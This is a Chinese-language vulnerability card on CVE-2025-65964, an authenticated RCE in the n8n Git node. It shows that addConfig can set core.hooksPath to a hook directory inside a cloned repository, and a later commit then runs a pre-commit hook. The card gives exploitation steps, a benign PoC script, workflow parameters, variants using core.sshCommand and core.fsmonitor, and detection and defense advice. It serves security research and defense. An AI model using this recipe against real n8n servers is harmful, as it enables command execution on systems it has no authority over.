---
id: web-nodejs-n8n-git-node-addconfig-hookspath-rce
title: n8n Git 节点 addConfig 注入 core.hooksPath：克隆非裸仓库后 commit 触发恶意 Hook RCE（CVE-2025-65964）
type: scenario
domain: web
path: web/nodejs
technique: n8n-git-node-addconfig-hookspath-injection
aliases:
- CVE-2025-65964
- n8n core.hooksPath 注入
- n8n Git 节点 addConfig RCE
- n8n 恶意 Hook 执行
- n8n 非裸仓库 Hooks 绕过
tags:
- n8n
- nodejs
- git
- core.hookspath
- hooks
- rce
- workflow
- authenticated
- cve-2025-65964
cve:
- CVE-2025-65964
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: 0.123.1 ≤ n8n < 1.119.2
verification:
  verified_by: verifier-V178
  verified_at: '2026-11-06T11:52:31+08:00'
  notes: 原文无图，已通读全文核对：CVE-2025-65964/CVSS 9.4、addConfig 未过滤 key/value、core.hooksPath 指向 evil_hooks、commit 触发 pre-commit、修复 d5a1171 的 N8N_GIT_NODE_ENABLE_HOOKS 默认 false + -c core.hooksPath=C:/Program Files/Git/dev/null 均与卡片一致；affected_versions 已按原文“0.123.1 ≤ n8n < 1.119.2”设置，卡片也标注了原文 1.113.0/1.64.3 的版本表述矛盾。未验证点：未按原文脚本实跑，且无截图可交叉验证。
---

## 一句话结论

n8n 的 Git 节点 `addConfig` 操作未限制配置键名，拥有工作流编辑权限的攻击者可把仓库的 `core.hooksPath` 指向克隆仓库内自带的脚本目录，再执行 `commit` 等 Git 操作触发 `pre-commit` Hook，以 n8n 进程用户身份执行任意命令（CVE-2025-65964，CVSS 9.4）。

## 原理

- **入口缺少过滤**：受影响版本的 Git 节点在 `addConfig` 分支中直接读取节点参数 `key`、`value`，随即调用 `git.addConfig(key, value, append)`，没有敏感键黑名单，也没有校验键名是否允许由工作流作者设置。
- **`core.hooksPath` 是 Git 的合法重定位开关**：该配置项用于把 Git 查找 Hook 的目录从默认的 `.git/hooks` 改到任意目录，Git 在执行 `commit`、`push`、`checkout` 等操作时会从新目录加载对应 Hook。Git 按设计不会验证该目录来源是否可信。
- **普通仓库即可携带恶意脚本**：攻击者把 `evil_hooks/pre-commit` 作为仓库普通文件提交，`git clone` 会像下载普通文件一样把它落到工作区；clone 本身不会执行它，因此不依赖裸仓库的 `hooks/` 目录。
- **配置写入与执行分离**：先 `addConfig` 写 `core.hooksPath=/tmp/target-repo/evil_hooks`，后续同一工作流的 `commit` 操作会读取该配置并执行 `evil_hooks/pre-commit`。命令在 n8n 服务进程中运行，权限等于 n8n 进程用户权限。
- **绕过前作修复**：CVE-2025-62726 的修复是设置 `N8N_GIT_NODE_DISABLE_BARE_REPOS`、禁止 Git 节点操作裸仓库；本漏洞使用完全合法的非裸仓库，不触发裸仓库检测，因此该防御无效。
- **官方修复**：引入 `N8N_GIT_NODE_ENABLE_HOOKS`（默认 `false`），未显式开启时 n8n 对每条 Git 命令附加 `-c core.hooksPath=/dev/null`。命令行 `-c` 优先级高于仓库本地 `.git/config`，所以攻击者即使成功写入 `core.hooksPath`，Git 运行时也会忽略，Hook 执行通道被从根上关闭。

## 触发条件

- n8n 版本在 `0.123.1 ≤ n8n < 1.119.2`（影响区间按原文标注；原文补丁章节另称 1.113.0 修复，版本信息存在出入，以官方公告为准）。
- 攻击者拥有可创建、编辑并执行工作流的账号（工作流权限即可，不要求管理员）。
- 攻击者能控制 Git 节点访问的仓库地址，或在 n8n 进程可读位置准备恶意仓库。
- Git 节点未被 `NODES_EXCLUDE` 禁用，且工作流中存在会触发 Hook 的 Git 操作（如 `commit`）。
- n8n 进程对克隆目标目录有写权限，能够完成 clone 与配置写入。

## 利用步骤

1. 准备恶意非裸仓库：在仓库中创建 `evil_hooks/pre-commit`，内容为要执行的命令，并赋予可执行权限；把它作为普通文件提交。
2. 在 n8n 中创建工作流，添加 Git 节点执行 `clone`，把该仓库克隆到进程可写目录（如 `/tmp/target-repo`）。
3. 添加 Git 节点 `addConfig`，`key=core.hooksPath`，`value=/tmp/target-repo/evil_hooks`（即克隆下来的恶意目录）。
4. 配置提交身份（Git 节点的用户名/邮箱配置），并向仓库写入一个待提交文件。
5. 添加 Git 节点执行 `commit`；Git 从 `core.hooksPath` 指定的目录加载并执行 `pre-commit`，命令以 n8n 进程用户身份运行。
6. 通过回连、写入文件或命令输出确认执行结果。

## PoC

恶意仓库最小准备（仅用于授权测试）：

```bash
mkdir -p evil_hooks
cat > evil_hooks/pre-commit <<'EOF'
#!/bin/sh
echo "Vulnerability Exploited!"
touch /tmp/pwned_success
EOF
chmod +x evil_hooks/pre-commit
git init
git add evil_hooks/pre-commit
git -c user.email=a@b.c -c user.name=attacker commit -m init
```

n8n 工作流关键节点参数：

```text
1) Git Clone
   sourceRepository: <恶意仓库地址>
   repositoryPath: /tmp/target-repo

2) Git addConfig
   key: core.hooksPath
   value: /tmp/target-repo/evil_hooks

3) Git Config User/Email
   user.name / user.email 任意值

4) Write File
   /tmp/target-repo/trigger.txt

5) Git Commit
   repositoryPath: /tmp/target-repo
```

执行工作流后检查 `/tmp/pwned_success` 是否被创建。原文提供了一个自动化脚本完成环境启动、恶意仓库生成、工作流导入与验证，并给出成功输出；本卡片未在本机复跑。

## 变体与关联

- 变体：按触发的 Git 操作选择 Hook 类型，例如 `pre-commit`、`pre-push`、`post-checkout`、`post-merge`，分别配合 commit/push/checkout/merge 节点。
- 变体：`core.hooksPath` 可指向 n8n 进程可写的任意目录，配合 Write/Read File 节点先把脚本写进去，不局限于克隆仓库内的目录。
- 变体：同类任意 Git 配置注入还可写 `core.sshCommand`、`core.fsmonitor` 等键，把触发点扩展到 fetch/pull/status。
- 关联：[[web-nodejs-n8n-git-node-gitconfig-sshcommand-rce]]（CVE-2026-27498，写 `.git/config` 注入 `core.sshCommand`）、[[web-nodejs-n8n-git-clone-arbitrary-file-write-rce]]（CVE-2026-21877，clone 的 `repositoryPath` 未校验导致任意文件写入）、[[web-golang-gogs-updaterepofile-symlink-git-config-rce]]（另一产品写 `.git/config`）。
- 前作 CVE-2025-62726 利用裸仓库 `hooks/` 目录，本漏洞是同一边界的非裸仓库绕过；修复引入的 `N8N_GIT_NODE_ENABLE_HOOKS` 同时覆盖两类攻击。

## 检测与防御

- 升级到包含 `N8N_GIT_NODE_ENABLE_HOOKS` 修复的 n8n 版本；确认未开启 Hooks 时 Git 节点命令带有 `-c core.hooksPath=/dev/null`。
- 如业务确需 Git Hooks，仅在完全可信环境显式开启，并配合工作流编辑权限收紧。
- 不需要 Git 节点时通过 `NODES_EXCLUDE` 禁用；n8n 以低权限容器运行，限制其可写目录与出站连接。
- 检测：审计工作流中的 Git `addConfig` 节点，重点关注 `core.hooksPath`、`core.sshCommand`、`core.fsmonitor` 等敏感键；排查克隆仓库中出现可执行脚本目录（如非 `.git` 路径下的 `pre-commit`）；监控 n8n 进程派生的 `git` 子进程及其随后执行的 shell 命令。
- 响应：删除恶意工作流与克隆目录，检查 n8n 数据目录、临时目录中的异常脚本与落地文件，轮换可能被读取的凭据，升级到修复版本。
